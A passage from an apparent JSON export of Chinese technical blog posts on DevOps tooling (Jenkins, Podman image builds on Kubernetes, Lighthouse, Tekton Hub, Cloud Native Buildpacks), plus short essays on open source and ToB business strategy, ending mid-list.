。用户通过页面触发 Jenkins 的执行操作，Jenkins 在 Kubernetes 中创建 Pod 作为 Agent 用于构建镜像，最后发布到环境中。\n在平台中，我们内置了 Python、Go、Nodejs、Java 构建客户端，通过内置或 Yaml 定义的方式，也可以很容易地添加其他类型的 Agent。\n4. 挑战与展望 DevOps 与 Jenkins 耦合紧密 虽然我们通过 Operator 对 DevOps 相关的数据和操作进行了自动化管理，但是请看下面这个流水线对象的描述。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 apiVersion: devops.kubesphere.io/v1alpha3 kind: Pipeline metadata: annotations: kubesphere.io/creator: admin creationTimestamp: \u0026#34;2021-03-24T20:04:22Z\u0026#34; finalizers: - pipeline.finalizers.kubesphere.io generation: 2 name: test namespace: testxxs9t resourceVersion: \u0026#34;41074824\u0026#34; selfLink: /apis/devops.kubesphere.io/v1alpha3/namespaces/testxxs9t/pipelines/test uid: 22fad924-8f13-400c-a249-7c792ce9ea68 spec: pipeline: discarder: days_to_keep: \u0026#34;7\u0026#34; num_to_keep: \u0026#34;10\u0026#34; jenkinsfile: echo \u0026#34;hello\u0026#34; name: test type: pipeline status: {} 从 Yaml 中可以看到 Spec 中相关的字段与 Jenkins 紧密相关，这其实非常不利于扩展，如果以后需要对接其他流程引擎，基本上只能重写一套 Operator。\nCRD == DataBase ？ 将 CRD 等同 DataBase 确实可以帮助研发快速写代码逻辑，但是缺乏抽象与设计将会导致灾难。推翻重构不是最难的，难的是在高速公路上去做，而且得保证平稳切换。数据的迁移是这个过程中，具有挑战的地方。在设计时，就需要考虑数据迁移的问题。\n统一的 Out DSL 最后，我比较期待的是一个通用的抽象模型，能够对接主流的 CICD 工具。用户通过定义执行流中的 Stage 和 上下文 Context，就可以对接各种流程引擎，而在底层只需要实现同一套 Interface 即可。\n","description":"","id":235,"section":"post","tags":["博文","DevOps","思考","云原生"],"title":"云原生下的 DevOps 平台","uri":"https://www.chenshaowen.com/blog/devops-platform-under-cloud-native.html.html"},{"content":"作者: [美] Eric S·Raymond\n出版社: 机械工业出版社\n原作名: The Cathedral \u0026amp; the Bazaar: Musings on Linux and Open Source by an Accidental Revolutionary\n译者: 卫剑钒\n出版年: 2014-5\nISBN: 9787111452478\nPDF: 点击查看\nNotes:\n大教堂隐喻由少数专家封闭式创作，不完成不发布的开发模式; 集市隐喻群策群力，小步快跑的敏捷开发模式。\n从 Linux ，到 Fetchmail ，再到 Netscape，作者研究并实践 Linus 方法，描述了开源的优越性，给出了很多自己的观察。比如，用户即合作者、发布策略、工程师文化、社区交接等。\n目前，在云原生重构基础设施的大背景下，开源迎来了高光时刻。但，开源社区的治理和运作依然是一个难解之题。特别是，商业公司开始全职开源项目，社区明显由少数公司主导。在这种情况下，如何保持社区的包容、活力、持续，这非常值得思考。\n","description":"","id":236,"section":"post","tags":["书籍","开源","社区"],"title":"大教堂与集市","uri":"https://www.chenshaowen.com/blog/book/musings-on-linux-and-open-source.html"},{"content":" 在 《大公司和小公司的 ToB 思路》 中，我对大公司的 ToB 策略进行了较多的分析，本篇将从另外一个角度补充关于小公司 ToB 策略的思考。\n1. 什么是 ToB 服务 一家商业公司通常维护着至少一条价值链，并从中获取利润。国内的中小企业平均寿命只有 2.5 年，新公司成立、旧公司破产是一种常态。破产的原因可能有很多，比如，不能适应巨变的商业环境，不能提供较高的附加值，主营业务不可持续，本身的管理效率低下等。这些都是普遍存在的问题，毕竟成功的只有少数，失败的是大多数。\nToB 的服务就是要提高商业公司应对变化时的适应力、面对竞争时的抵抗力、处于绝境时的反转力，以延长存续期。\n商业公司强调的是利润，而 利润 = 收入 - 成本 。想要获得更多的利润，只有两条路，增加收入或降低成本，ToB 的机会由此而来。\n举两个例子。对于制造业，少不了的是供应链。如果有一套软件能将整个过程管理起来，实现从订单、生产、物流的全程管理，那么将极大地加快周转效率，提升收入。另一个例子是外包服务。商业公司将非核心的业务剥离给专业的服务商，能降低成本和风险，控制组织的规模。\n另一个需要思考的问题是，为什么是你，而不是别人？竞标是 ToB 绕不开的，货比三家，价优物美者得。排除一些不可抗力的黑箱操作，ToB 服务也需要站在买家的位置进行思考，自己的产品为什么值得付这么多费用。下面是从两个角度，思考这个问题。\n2. 自下而上 自下而上，通常是大公司采取的一种策略。利用自有的业务进行孵化，打磨产品，然后抽象为通用的解决方案。\n大公司自身的体量，会给予产品背书，让其在市场上形成竞争力。\n但 ToB 是一门低增长率、需要持续投入的生意，不是每一个 ToC 的公司都愿意参与的。通常是自身业务增长受限，才会考虑换赛道、换行业。\n3. 自上而下 自上而下，通常是小公司采取的一种策略。将自身对领域的理解转化为产品。\n能参与小公司的创业，必定是有特殊的资源或重器。小公司难以给产品提供背书，因此主要依靠少数人的权威、客户关系。客户关系是一部分小公司存在的关键，也是可遇而难求的机缘，下面主要聊聊另外一个因素。\n小公司需要的是在细分的行业持续耕耘，对领域有着深入而全面了解的人。在目前浮躁的商业环境下，这样的人是难能可贵的。小公司愿意承担一定的风险，给他们机会，独当一面地去创造，这是大公司给不了的。老专家和小公司，两者各取所需，一个实现了自己的意志，一个获得了商业的机会。\n这其实也是一种理想的状态，因为有时小公司根本就吸引不了老专家。但为了建立这种权威，又不得不利用一些特殊的手段借势。在软件领域，开源就被举得很高。开源软件又可以借势上游的开源软件。\n如果建立不了权威，无法说服客户，那么就只能依靠贴心的服务。这种非标准化的服务方式，时常被客户牵着走，无法大规模铺开，走向了定制化的路线。\n","description":"","id":237,"section":"post","tags":["博文","ToB","思考","商业模式"],"title":"自上而下 VS 自下而上","uri":"https://www.chenshaowen.com/blog/top-to-bottom-vs-bottom-to-top.html"},{"content":" 本文介绍一个 ChatOps 工具 Lighthouse, 主要内容来自官方文档 。Kubernetes 社区使用 Prow 驱动其在 GitHub 上的协作, 但是不适用于其他仓库。Lighthouse 普适于更多类型的 Git 仓库。\n1. 什么是 Lighthouse Lighthouse 是一个基于 webhooks 的轻量级 ChatOps 工具 , 通过 Git 仓库的 webhooks 可以触发 Jenkins X 流水线 、Tekton 流水线 、Jenkins 任务, 支持 GitHub、GitHub Enterprise、BitBucket Server 和 GitLab。\n2. Lighthouse 与 Prow 的关系 Lighthouse 最初是由 Prow 衍生而来, 并拷贝了一些基础代码。目前, Lighthouse 支持标准的 Prow 插件, 能够处理分支推送的 webhooks 用来触发指定的流水线执行。Lighthouse 和 Prow 一样, 使用 config.yaml 和 plugins.yaml 进行配置。\n不同之处在于, Lighthouse 使用的是 jenkins-x/go-scm , 可以支持更多类型的 Git 仓库, 而不限于 GitHub。 Lighthouse 没有使用 ProwJob CRD , 而是使用自己的 LighthouseJob CRD。\n3. 安装方式 Lighthouse 以 Helm Chart 包对外进行发布。\n下面是安装命令:\n添加仓库 1 2 3 helm repo add jenkins-x http://chartmuseum.jenkins-x.io helm repo update 安装或升级 1 2 3 4 5 # Helm v2 helm upgrade --install my-lighthouse --namespace lighthouse jenkins-x/lighthouse # Helm v3 helm upgrade --install my-lighthouse --namespace lighthouse jenkins-x/lighthouse 卸载 1 2 3 4 5 # Helm v2 helm delete --purge my-lighthouse # Helm v3 helm uninstall my-lighthouse --namespace lighthouse Lighthouse 还针对 Jenkins 和 Tekton 提供了专门的安装和配置文档。\n4. 如何移植 Prow 插件 如果有你想要使用, 但是没有移植到 Lighthouse 的插件, 可以按照下面的步骤移植:\nLighthouse 重用了 Prow 的插件代码和配置文件。因此, 主要的工作是将 k8s.io/test-infra/prow 的内容导入到 github.com/jenkins-x/lighthouse/pkg/prow, 然后修改 GitHub Client 的结构, 例如, 将 github.PullRequest 修改为 scm.PullRequest 。\nGitHub Client 中的大部分结构都可以和 jenkins-x/go-scm 中的一一对应。但是, go-scm 默认返回指向资源指针的切片。API 部分也会有一些命名上的差异。比如, 在实现 lgtm 时, Prow 和 Lighthouse 的 githubClient API 就有差异。\n原文: https://github.com/jenkins-x/lighthouse\n","description":"","id":238,"section":"post","tags":["翻译","DevOps","Prow","Kubernetes","CICD","Lighthouse"],"title":"DevOps 工具链之 Lighthouse 介绍","uri":"https://www.chenshaowen.com/blog/lighthouse-of-devops-tool-chain.html"},{"content":"\n从原理上看，在 Kubernetes 集群中，Jenkins 都可以使用 Podman 进行镜像构建，本文主要以 Containerd 为例。\n1. 去 Docker 给 CICD 带来新的挑战 在 CICD 场景下, 我们经常需要在流水线中构建和推送镜像。\n在之前的文档 《在 Kubernetes 上动态创建 Jenkins Slave》 中, 我描述了通过挂载 /var/run/docker.sock 文件, 允许在 Docker 驱动的 Kubernetes 集群中构建和推送镜像。在文档 《如何在 Docker 中使用 Docker》中, 我又进行了更加详细地阐述, 其原理是共享主机 Docker Daemon。\n在 1.20 版本之后, Kubernetes 社区放弃了对 Docker 的支持, 而后又有其他社区接手, 隐约给 Docker 蒙上了一层阴影。在这样的背景下, 我们开始考虑非 Docker 环境下, 如何进行 CICD 实践。\n非 Docker 环境意味着之前挂载 /var/run/docker.sock 的方式失效了, 我们需要寻找新的解决方案。\n2. 测试集群环境 2.1 Kubernetes - 1.17.9 执行如下命令, 查看 Kubernetes 版本:\n1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:18:16Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.9\u0026#34;, GitCommit:\u0026#34;4fb7ed12476d57b8437ada90b4f93b17ffaeed99\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:10:45Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 2.2 Containerd - 1.4.3 执行如下命令, 查看 containerd 版本:\n1 2 3 containerd --version containerd github.com/containerd/containerd v1.4.3 269548fa27e0089a8b8278fc4fc781d7f65a939b 3. 镜像管理工具 Podman 由于 Containerd 不支持 Docker API, 常见的 docker build、docker push 等命令在 Containerd 环境下无法使用。因此, 需要一种不依赖于 Docker, 针对 OCI 标准的镜像构建和推送工具。\n3.1 Podman 简介 Podman 是一个实现 OCI 标准的容器和镜像管理工具, 同时也是 Daemonless, 不需要守护进程, 也支持非特权用户使用。Podman 提供了类似 Docker CLI 的功能, 大部分情况下可以执行 alias docker=podman 使用 Podman 替换 Docker , 而不会有任何问题。\n3.2 Podman 安装 安装 Podman 命令行工具 安装方法可以参考 Podman 的安装指引。这里以 CentOS 7 为例:\n1 2 curl -L -o /etc/yum.repos.d/devel:kubic:libcontainers:stable.repo https://download.opensuse.org/repositories/devel:kubic:libcontainers:stable/CentOS_7/devel:kubic:libcontainers:stable.repo yum -y install podman 查看 Podman 版本 1 2 3 podman --version podman version 3.0.1 查看命令参数 这里为了方便查阅, 贴出完整的帮助文档。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 podman --help manage pods and images Usage: podman [flags] podman [command] Available Commands: attach Attach to a running container build Build an image using instructions from Containerfiles commit Create new image based on the changed container container Manage Containers cp Copy files/folders between a container and the local filesystem create Create but do not start a container diff Inspect changes on container\u0026#39;s file systems events Show podman events exec Run a process in a running container export Export container\u0026#39;s filesystem contents as a tar archive generate Generated structured data healthcheck Manage Healthcheck help Help about any command history Show history of a specified image image Manage images images List images in local storage import Import a tarball to create a filesystem image info Display podman system information init Initialize one or more containers inspect Display the configuration of a container or image kill Kill one or more running containers with a specific signal load Load an image from container archive login Login to a container registry logout Logout of a container registry logs Fetch the logs of a container mount Mount a working container\u0026#39;s root filesystem network Manage Networks pause Pause all the processes in one or more containers play Play a pod pod Manage pods port List port mappings or a specific mapping for the container ps List containers pull Pull an image from a registry push Push an image to a specified destination restart Restart one or more containers rm Remove one or more containers rmi Removes one or more images from local storage run Run a command in a new container save Save image to an archive search Search registry for image start Start one or more containers stats Display a live stream of container resource usage statistics stop Stop one or more containers system Manage podman tag Add an additional name to a local image top Display the running processes of a container umount Unmounts working container\u0026#39;s root filesystem unpause Unpause the processes in one or more containers unshare Run a command in a modified user namespace varlink Run varlink interface version Display the Podman Version Information volume Manage volumes wait Block on one or more containers Flags: --cgroup-manager string Cgroup manager to use (cgroupfs or systemd) (default \u0026#34;systemd\u0026#34;) --cni-config-dir string Path of the configuration directory for CNI networks --config string Path of a libpod config file detailing container server configuration options --conmon string Path of the conmon binary --cpu-profile string Path for the cpu profiling results --events-backend string Events backend to use --help Help for podman --hooks-dir strings Set the OCI hooks directory path (may be set multiple times) --log-level string Log messages above specified level: debug, info, warn, error, fatal or panic (default \u0026#34;error\u0026#34;) --namespace string Set the libpod namespace, used to create separate views of the containers and pods on the system --network-cmd-path string Path to the command for configuring the network --root string Path to the root directory in which data, including images, is stored --runroot string Path to the \u0026#39;run directory\u0026#39; where all state information is stored --runtime string Path to the OCI-compatible binary used to run containers, default is /usr/bin/runc --storage-driver string Select which storage driver is used to manage storage of images and containers (default is overlay) --storage-opt stringArray Used to pass an option to the storage driver --syslog Output logging information to syslog as well as the console --tmpdir string Path to the tmp directory --trace Enable opentracing output -v, --version Version of podman Use \u0026#34;podman [command] --help\u0026#34; for more information about a command. Podman 在覆盖 Docker 命令的同时，增加了对 Pod 操作的支持。\n3.3 主机上测试编译并推送镜像 在使用上可以直接将 docker 命令替换为 podman 即可。\n编译镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 echo -e \u0026#39;FROM busybox\\nRUN echo \u0026#34;hello world\u0026#34;\u0026#39; | podman build -t docker.io/shaowenchen/myimage:latest - STEP 1: FROM busybox Getting image source signatures Copying blob 5c4213be9af9 done Copying config 491198851f done Writing manifest to image destination Storing signatures STEP 2: RUN echo \u0026#34;hello world\u0026#34; hello world STEP 3: COMMIT 4c8794086d9de80f71d182457b6d2cb18b9d61975b98bcd4cb167bdcabae5b2c 4c8794086d9de80f71d182457b6d2cb18b9d61975b98bcd4cb167bdcabae5b2c 查看编译的镜像 1 2 podman images |grep shaowenchen docker.io/shaowenchen/myimage latest 4c8794086d9d 4 minutes ago 1.46 MB 登录 DockerHub 1 2 3 4 podman login docker.io -u shaowenchen Password: Login Succeeded! 推送镜像 1 2 3 4 5 6 7 8 9 podman push docker.io/shaowenchen/myimage:latest Getting image source signatures Copying blob 2893437c336c done Copying blob 84009204da3f done Copying config 4c8794086d done Writing manifest to image destination Storing signatures 4. Jenkns 中使用 Podman 构建镜像 4.1 关键配置 使用 hostPath 将 /var/lib/containers 挂载到主机上 也可以使用 PVC，但是 PVC 可能需要加参数，见下文。\n否则会有如下报错:\n1 Error: \u0026#39;overlay\u0026#39; is not supported over overlayfs, a mount_program is required: backing file system is unsupported for this graph driver privileged 特权模式 否则会有如下报错:\n1 Error: kernel does not support overlay fs: \u0026#39;overlay\u0026#39; is not supported over extfs at \u0026#34;/var/lib/containers/storage/overlay\u0026#34;: backing file system is unsupported for this graph driver Podman 参数 --cgroup-manager=cgroupfs 在使用 PVC 作为存储目录时, 需要考虑这项配置。内核通过 Cgroup Driver 隔离一组资源, 可选的参数有 cgroupfs 和 systemd, 需要与集群环境保持一致, 因为他们共用一个内核。我的测试环境使用的是 cgroupfs 。\n否则会有如下报错:\n1 systemd cgroup flag passed, but systemd support for managing cgroups is not available Podman 参数 --events-backend=file 这项配置通常不会 Block 执行流程，如果你想保持日志更加干净，可以添加。\n否则会有如下报错:\n1 unable to write system event: \u0026#34;write unixgram @0011c-\u0026gt;/run/systemd/journal/socket: sendmsg: no such file or directory 4.2 示例一: 在 Jenkinsfile 中显式使用 yaml 模板 这里将容器 /var/lib/containers 挂载到主机 /var/lib/containers 目录，也可以挂载到主机 /tmp 目录，并没有强制要求。主机目录只是提供一个存放数据的地方。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 pipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod spec: containers: - name: centos image: centos:7 command: - cat tty: true securityContext: privileged: true volumeMounts: - name: storage mountPath: /var/lib/containers volumes: - name: storage hostPath: path: /var/lib/containers \u0026#34;\u0026#34;\u0026#34; }} stages { stage(\u0026#39;Hello\u0026#39;) { steps { container(\u0026#39;centos\u0026#39;) { sh \u0026#39;\u0026#39;\u0026#39; curl -L -o /etc/yum.repos.d/devel:kubic:libcontainers:stable.repo https://download.opensuse.org/repositories/devel:/kubic:/libcontainers:/stable/CentOS_7/devel:kubic:libcontainers:stable.repo yum -y install podman echo -e \u0026#39;FROM busybox\\nRUN echo \u0026#34;hello world\u0026#34;\u0026#39; | podman --events-backend=file build -t docker.io/shaowenchen1/myimage:latest - podman --events-backend=file images |grep shaowenchen1 \u0026#39;\u0026#39;\u0026#39; } } } } } Jenkins 的执行日志:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ··· Dependency Updated: systemd.x86_64 0:219-78.el7_9.3 systemd-libs.x86_64 0:219-78.el7_9.3 Complete! + podman --events-backend=file build -t docker.io/shaowenchen1/myimage:latest - + echo -e \u0026#39;FROM busybox RUN echo \u0026#34;hello world\u0026#34;\u0026#39; STEP 1: FROM busybox STEP 2: RUN echo \u0026#34;hello world\u0026#34; --\u0026gt; Using cache 4c8794086d9de80f71d182457b6d2cb18b9d61975b98bcd4cb167bdcabae5b2c STEP 3: COMMIT docker.io/shaowenchen1/myimage:latest --\u0026gt; 4c8794086d9 4c8794086d9de80f71d182457b6d2cb18b9d61975b98bcd4cb167bdcabae5b2c + podman --events-backend=file images + grep shaowenchen1 docker.io/shaowenchen1/myimage latest 4c8794086d9d 19 hours ago 1.46 MB 4.3 示例二: 使用 PVC 挂载 /var/lib/containers 目录 在使用 PVC 存储 Podman 数据时，需要提前准备好集群的存储。\n查看集群是否有默认的 StorageClass 1 2 3 4 5 6 7 kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE openebs-device openebs.io/local Delete WaitForFirstConsumer false 19d openebs-hostpath (default) openebs.io/local Delete WaitForFirstConsumer false 19d openebs-jiva-default openebs.io/provisioner-iscsi Delete Immediate false 19d openebs-snapshot-promoter volumesnapshot.external-storage.k8s.io/snapshot-promoter Delete Immediate false 19d 为 Podman 创建一个 PVC 这里的 namespace 需要与 Jenkins 中动态 Agent 所在的 namespace 保持一致。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: PersistentVolumeClaim metadata: name: storage namespace: default spec: accessModes: - ReadWriteOnce resources: requests: storage: 30Gi EOF 查看创建的 PVC 1 2 3 4 kubectl -n default get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES storage Pending openebs-hostpath 11s 由于使用的是 WaitForFirstConsumer 模式，需要等到有 Pod 使用 PVC 时，才会绑定 PV。\n创建 Jenkins 流水线执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 pipeline { agent { kubernetes { yaml \u0026#34;\u0026#34;\u0026#34; apiVersion: v1 kind: Pod spec: containers: - name: centos image: centos:7 command: - cat tty: true securityContext: privileged: true volumeMounts: - name: storage mountPath: /var/lib/containers volumes: - name: storage persistentVolumeClaim: claimName: storage \u0026#34;\u0026#34;\u0026#34; }} stages { stage(\u0026#39;Hello\u0026#39;) { steps { container(\u0026#39;centos\u0026#39;) { sh \u0026#39;\u0026#39;\u0026#39; curl -L -o /etc/yum.repos.d/devel:kubic:libcontainers:stable.repo https://download.opensuse.org/repositories/devel:/kubic:/libcontainers:/stable/CentOS_7/devel:kubic:libcontainers:stable.repo yum -y install podman echo -e \u0026#39;FROM busybox\\nRUN echo \u0026#34;hello world\u0026#34;\u0026#39; | podman --events-backend=file build -t docker.io/shaowenchen2/myimage:latest - podman --events-backend=file images |grep shaowenchen2 \u0026#39;\u0026#39;\u0026#39; } } } } } Jenkins 的执行日志:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ··· Dependency Updated: systemd.x86_64 0:219-78.el7_9.3 systemd-libs.x86_64 0:219-78.el7_9.3 Complete! + echo -e \u0026#39;FROM busybox RUN echo \u0026#34;hello world\u0026#34;\u0026#39; + podman --events-backend=file build -t docker.io/shaowenchen2/myimage:latest - STEP 1: FROM busybox STEP 2: RUN echo \u0026#34;hello world\u0026#34; --\u0026gt; Using cache f4676f5b5e47a78970f2d97f4a5b77423f381e9742faae06d8c1a2d93bdb27c2 STEP 3: COMMIT docker.io/shaowenchen2/myimage:latest --\u0026gt; f4676f5b5e4 f4676f5b5e47a78970f2d97f4a5b77423f381e9742faae06d8c1a2d93bdb27c2 + podman --events-backend=file images + grep shaowenchen2 docker.io/shaowenchen2/myimage latest f4676f5b5e47 2 hours ago 1.46 MB 5. 总结 本文主要提供了一种在非 Docker 驱动的 Kubernetes 集群中，进行 CICD 镜像构建的思路，使用 Podman 替换 Docker 。选择 Podman 的原因是, 其使用方式更贴近 Docker，而 Buildah 需要用户修改镜像编译指令，因为 Buildah 使用的是 buildah bud。\n在生产实践过程中，我们需要将 Podman 命令打包到 CI Agent 的基础镜像中。通过 alias docker=podman , 对基于 Docker 命令的流水线进行替换。\n下面简单总结一下，使用 Podman 的要点:\n支持缓存。通过挂载 /var/lib/containers 目录，可以缓存镜像，并且可以根据业务划分到不同目录。 与 Docker 无缝替换。如果有 hook 的地方，可以用户无感知地切换。 更加通用。针对 OCI 标准实现，不依赖具体组件。 特权模式。容器中运行 Podman 需要特权模式。容器套娃很难摆脱的运行模式。 6. 参考 https://github.com/kubernetes-sigs/cri-tools http://docs.podman.io/en/latest/ ","description":"","id":239,"section":"post","tags":["博文","Jenkins","DevOps","CICD","Docker","Kubernetes"],"title":"基于 Kubernetes 的 Jenkins 服务也可以去 Docker 了","uri":"https://www.chenshaowen.com/blog/using-podman-to-build-images-under-kubernetes-and-jenkins.html"},{"content":" 原文由来自 Red Hat (CDF 成员) 的 Puneet Punamiya 撰写。\nTekton 是持续交付基金会 (CDF) 下的一个开源项目。它提供了一个以云原生构建 CI/CD 系统的框架。简单点说, 人们可以将整个 CI/CD 流水线定义为 Kubernetes 资源。\nTekton Pipelines 的核心是一个可复用的组件 - Task, 很容易共享。在 Tekton Catalog 仓库中包含了这些 Task 的列表。这些 Task 可以在很多流水线间进行复用, 用于解决同一类问题, 比如构建并推送镜像, 语法检查等。\n随着 Tekton Pipelines 越来越多的被采纳, Tekton Catalog 下 Task 的数量也越来越多。这导致了一些麻烦; 由于目录的分散性, 用户很难搜索、安装和升级 Task。这就是我们创建 Tekton Hub 的原因。这个 Web 平台为发现和贡献 Tekton 资源, 例如 Tasks、Pipelines, 提供了一个集中入口。\nTekton Hub 之前提供的是预览版 Tekton Hub Preview, 现在正式推出了。\nTekton Hub 正式上线! Tekton Hub(原文地址 https://hub-preview.tekton.dev/, 译者校验为 https://hub.tekton.dev/) 给用户提供了一个集中的位置, 用于从 Community Catalog 中发现一组精选的资源。这些资源可以通过名称、显示名称进行搜索, 按照类别（cloud、cli、Github 等）进行过滤, 根据用户评分进行排序。\n此外, Tekton Hub 还为外部工具 (Tekton CLI、VSCode 和 IntelliJ) 提供了 API 服务, 可以用来与 Tekton Hub 进行集成, 直接在这些工具中搜索、下载、安装 Tasks。\n我们先从 Tekton CLI 开始, 它集成了 Tekton Hub 暴露的 APIs 接口。Tekton CLI 可以从 Tekton Hub 安装、升级一个 Task。接下来是在 Visual Studio Code 和 IntelliJ 上的 Tekton Pipelines 扩展。这些扩展将允许用户在 IDE 中和 Tekton Hub 交互。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 tkn hub Interact with tekton hub Usage: tkn hub [flags] tkn hub [command] Available Commands: downgrade Downgrade an installed resource get Get resource manifest by its name, kind, catalog, and version info Display info of resource by its name, kind, catalog, and version install Install a resource from a catalog by its kind, name and version reinstall Reinstall a resource by its kind and name search Search resource by a combination of name, kind, and tags upgrade Upgrade an installed resource Flags: --api-server string Hub API Server URL (default \u0026#34;https://api.hub.tekton.dev\u0026#34;) -h, --help help for hub Use \u0026#34;tkn hub [command] --help\u0026#34; for more information about a command. 下一步的计划 我们有计划让 Tekton 变得更好。从这些事开始:\n共享很多分布式的 Tekton catalogs 中的 Tekton 资源, 这些资源属于不同的组织和团队 支持多种 Git 平台, 例如 GitLab、Bitbucket 等 我们很高兴能与大家分享 Tekton Hub! 这是一个巨大的里程碑, 我们希望你能发现它很有用。现在就来试试 Tekton Hub 吧。\n原文链接: https://cd.foundation/uncategorized/2021/02/23/tekton-hub-is-live/\n","description":"","id":240,"section":"post","tags":["翻译","Tekton","CICD","DevOps"],"title":"Tekton Hub 正式上线 - https://hub.tekton.dev/","uri":"https://www.chenshaowen.com/blog/tekton-hub-is-live.html"},{"content":"1. Buildpack 老树开新花 Buildpacks 项目最早是由 Heroku 在 2011 年发起, 被以 Cloud Foundry 为代表的 PaaS 平台广泛采用。在之前的文档 《PaaS 部署之 buildpack》 中, 我演示了如何将一个 Django 应用部署到 Heroku 上。\nBuildpacks 不足的是产出包是 Droplet 格式, 不能直接适配容器平台。\n在 2018 年 1 月, Pivotal 和 Heroku 发起了一个项目 Cloud Native Buildpacks(简称, CNB) , 并在同年十月份加入 CNCF 。这个项目的目标就是实现一个统一的应用打包生态系统。\n简单点就是, 之前打包出来是 Droplet, 现在是 OCI 容器镜像, 可以部署在任意兼容 OCI 镜像的容器平台。工作原理如下:\n探测。根据源码内容, 自动探测、匹配 buildpacks 。 分析。在历史构建中, 查找缓存。 构建。将应用的源码, 创建为可运行的包 导出 OCI 格式的容器镜像。 2. Cloud Native Buildpacks 适合哪些人 Cloud Native Buildpacks 非常适合需要频繁打包应用的场景, 而且应用的种类比较多。\naPaaS 平台 aPaaS 是提供运行时的平台, 经常需要部署各类应用。使用 Cloud Native Buildpacks 能规范打包流程, 快速将源码转换为镜像。\nFaaS 平台 FaaS 平台提供函数的运行环境。在以容器为核心的基础设施上, FaaS 将用户代码打包为镜像, 再创建容器运行。而 Cloud Native Buildpacks 既能探测用户代码的编程语言、框架, 还能快速编译成 OCI 镜像, 正是 FaaS 之所需。Google Cloud Platform 的 FaaS 采用的就是 Buildpacks。\n开发者 并不是每个开发者都适合使用 Cloud Native Buildpacks, 学习和维护也需要成本。如果你有很多应用需要维护和发布, 那么 Cloud Native Buildpacks 将拯救你, 起码可以少写很多 Dockerfile。\n3. 与同类应用打包工具的比较 关于 S2I, 我之前写过一篇文档, 使用 S2I 构建云原生应用。我负责研发的一款产品中, 采用的就是 S2I 对源码进行打包成镜像。\n而 Buildpacks 是我上一份工作中接触到的技术。当时我开发 SaaS , 需要借助 Buildpacks 打包应用。\n这是来自 Buildpacks 社区的同类工具对比:\nLogo Product Name Cloud Native Buildpacks source-to-image (s2i) Jib ko Advanced Caching Yes Yes No No Bill-of-Materials Yes No No No Modular / Pluggable Yes No N/A † N/A † Multi-language Yes Yes No No Multi-process Yes No No No Minimal app image Yes Yes ‡ Yes Yes Rebasing Yes No No No Reproducibility Yes No Yes Yes Reusability Yes Yes N/A † N/A † Integrations * Azure\n* CircleCI\n* GitLab\n* Google\n* Heroku\n* Spring Boot\n* Tekton\n* \u0026hellip; * OpenShift * Gradle\n* Maven Governance CNCF Red Hat Google Google 从生态和功能上看, Buildpacks 比 S2I 更好。\n4. 在 Docker 环境下打包应用 需要提前安装 Git 环境, 在 Docker 环境下操作。\n4.1 安装 Pack 命令工具 Pack 是 Cloud Native Buildpacks 提供用于使用 buildpacks 的工具。这里以 Linux 系统为例进行安装:\n1 (curl -sSL \u0026#34;https://github.com/buildpacks/pack/releases/download/v0.17.0/pack-v0.17.0-linux.tgz\u0026#34; | sudo tar -C /usr/local/bin/ --no-same-owner -xzv pack) 查看 pack 的版本\n1 2 3 pack version 0.17.0+git-d9cb4e7.build-2045 4.2 打包一个应用 克隆代码 1 git clone https://github.com/shaowenchen/devops-python-sample 进入代码目录 1 cd devops-python-sample/src 查看代码目录 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 tree . |-- manage.py |-- project | |-- app1 | | |-- admin.py | | |-- apps.py | | |-- __init__.py | | |-- migrations | | | `-- __init__.py | | |-- models.py | | |-- tests.py | | `-- views.py | |-- __init__.py | |-- settings.py | |-- tests.py | |-- urls.py | `-- wsgi.py `-- requirements.txt 3 directories, 14 files 这是一个非常普通的 Django 项目结构。\n查看推荐的 Builder Builder 定义如何将源码转换为镜像的步骤, 如果有自己熟悉的 Builder 可以直接使用, 也可以使用 Pack 推荐的 Builder 。\n1 2 3 4 5 6 7 8 9 10 11 12 pack builder suggest Suggested builders: Google: gcr.io/buildpacks/builder:v1 Ubuntu 18 base image with buildpacks for .NET, Go, Java, Node.js, and Python Heroku: heroku/buildpacks:18 heroku-18 base image with buildpacks for Ruby, Java, Node.js, Python, Golang, \u0026amp; PHP Heroku: heroku/buildpacks:20 heroku-20 base image with buildpacks for Ruby, Java, Node.js, 